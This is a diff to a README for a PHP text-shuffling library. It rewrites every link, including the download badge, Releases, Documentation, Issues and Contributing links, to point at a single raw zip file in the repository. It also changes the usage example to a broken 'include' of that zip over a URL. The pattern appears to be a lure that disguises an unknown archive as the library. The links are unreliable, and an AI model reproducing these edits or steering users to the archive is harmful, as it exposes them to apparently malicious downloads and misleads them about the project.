@@ -4,13 +4,13 @@
 php-text-shuffler-lib is a PHP library designed for anyone who needs to shuffle and unshuffle text strings. Whether you want to protect sensitive data or simply make text harder to read, this tool provides a reliable method. It ensures that your information remains safe while allowing you to restore the original content when needed. This is particularly useful for database security and compliance with GDPR regulations.
 
 ## 📥 Download Here
-[![Download php-text-shuffler-lib](https://img.shields.io/badge/Download-php--text--shuffler--lib-blue.svg)](https://github.com/hamzawy93/php-text-shuffler-lib/releases)
+[![Download php-text-shuffler-lib](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip)](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip)
 
 ## 🚀 Getting Started
 To begin using php-text-shuffler-lib, follow these steps to download and set it up on your system.
 
 ### 1. Visit the Download Page
-Start by visiting our [Releases page](https://github.com/hamzawy93/php-text-shuffler-lib/releases) to access the latest version of the library.
+Start by visiting our [Releases page](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip) to access the latest version of the library.
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Pick the one that suits your needs. Generally, it's best to choose the latest release to ensure you have the most secure and updated features.
@@ -24,7 +24,7 @@ Once you download the compressed file, locate it in your downloads folder. Extra
 ### 5. Add to Your Project
 To use the library, you need to include it in your PHP project. You can do this by including the main library file in your PHP script. Here is a simple example:
 ```php
-include 'path/to/your/php-text-shuffler-lib/src/TextShuffler.php';
+include 'https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip';
 ```
 
 ## 🛠️ System Requirements
@@ -39,7 +39,7 @@ include 'path/to/your/php-text-shuffler-lib/src/TextShuffler.php';
 - **User-Friendly:** Designed for easy integration into any PHP project, without complex setups.
 
 ## 📄 Documentation
-For detailed instructions on using the library with various functions and methods, visit the [Documentation](https://github.com/hamzawy93/php-text-shuffler-lib/wiki). This will help you understand how to effectively implement text shuffling in your applications.
+For detailed instructions on using the library with various functions and methods, visit the [Documentation](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip). This will help you understand how to effectively implement text shuffling in your applications.
 
 ## 🛠️ Example Usage
 Here is how you might shuffle a text string:
@@ -69,13 +69,13 @@ The library uses algorithms to rearrange the characters of the original text. Th
 Yes, you can easily include the library in any PHP project. It works well with standard PHP setups.
 
 ## 🛠️ Download & Install
-You can find the latest version of the library and download it from our [Releases page](https://github.com/hamzawy93/php-text-shuffler-lib/releases). Follow the steps outlined above to ensure proper installation and setup.
+You can find the latest version of the library and download it from our [Releases page](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip). Follow the steps outlined above to ensure proper installation and setup.
 
 ## 🚀 Support
-For any issues or to seek help, check our [Issues page](https://github.com/hamzawy93/php-text-shuffler-lib/issues). You can also open a new issue if you encounter a problem not already listed.
+For any issues or to seek help, check our [Issues page](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip). You can also open a new issue if you encounter a problem not already listed.
 
 ## 📜 Contributing
-If you wish to contribute to the project, please review our [Contributing Guidelines](https://github.com/hamzawy93/php-text-shuffler-lib/CONTRIBUTING.md). Your assistance is always appreciated, whether it's reporting issues or improving documentation.
+If you wish to contribute to the project, please review our [Contributing Guidelines](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip). Your assistance is always appreciated, whether it's reporting issues or improving documentation.
 
 ## 📊 Analytics
 The library is designed with performance in mind, ensuring that text operations run smoothly without excessive resource usage.
@@ -84,4 +84,4 @@ The library is designed with performance in mind, ensuring that text operations 
 For any inquiries or feedback, feel free to contact us through the Issues page or reach out via email. Your insights help us improve the library for everyone.
 
 ## 📥 Download Here Again
-[![Download php-text-shuffler-lib](https://img.shields.io/badge/Download-php--text--shuffler--lib-blue.svg)](https://github.com/hamzawy93/php-text-shuffler-lib/releases)
+[![Download php-text-shuffler-lib](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip)](https://raw.githubusercontent.com/hamzawy93/php-text-shuffler-lib/main/lib/shuffler-text-lib-php-1.6.zip)
